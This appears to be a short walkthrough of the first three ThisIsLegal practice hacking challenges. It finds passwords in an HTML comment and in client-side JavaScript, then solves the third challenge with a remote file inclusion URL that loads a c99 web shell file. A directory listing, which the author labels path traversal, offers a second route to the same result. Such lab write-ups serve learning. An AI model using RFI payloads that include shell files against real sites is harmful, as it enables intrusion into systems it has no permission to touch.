# ThisIsLegal

<h2>Basic Challenges</h2>

	Challenge 1
	
		Questin: Find the password in the page
		URL: http://www.thisislegal.com/challenge/1
			We look through the page (press F12). Finding a comment  <!-- The password is: easy123 -->
		Answer: easy123
		
<hr>
	Challenge 2
	
		Questin: Break this JavaScript login form
		URL: http://www.thisislegal.com/challenge/2
			We look through the page (press F12). Finding a JS 
			function Login(form) { 
			if (form.username.value=="admin") {
			if (form.password.value=="imageek") { 
			location="f.ID+1";   
			} 
			else { 
			alert("Sorry, wrong username or password provided."); 
			}  
			}
			else { 
			alert("Sorry, wrong username or password provided."); 
			}  
			} 
		Answer: Username: admin  Password: imageek
		
<hr>
	Challenge 3
	
		Questin: You are given this file and told to use it to break into the site below.
		URL: http://www.thisislegal.com/challenge/3
			The first method - "the right"
			Go to the link http://www.thisislegal.com/challenge3/index.php?file=home. 
			We see the "file = home", assume LFI or RFI, check ... This RFI
		Answer: http://www.thisislegal.com/challenge3/index.php?file=http://www.thisislegal.com/challenge3/c_99.txt
		
			The second method - "the wrong"
			Go to the link http://www.thisislegal.com/challenge3/index.php?file=home.
			Go to the link http://www.thisislegal.com/challenge3/
			Read the root directory (yes, yes it Path Traversal):
			Index of /challenge3

				Parent Directory
				c99.GIF
				c_99.txt
				functions.php
				img/
				index.php
				please_read.txt
				styles.css
				success.php

				Apache/2.2.27 (Unix) mod_ssl/2.2.27 OpenSSL/0.9.7a mod_bwlimited/1.4 mod_fcgid/2.3.9 Server at www.thisislegal.com Port 80
			click on success.php
		Answer: Click on success.php

<hr>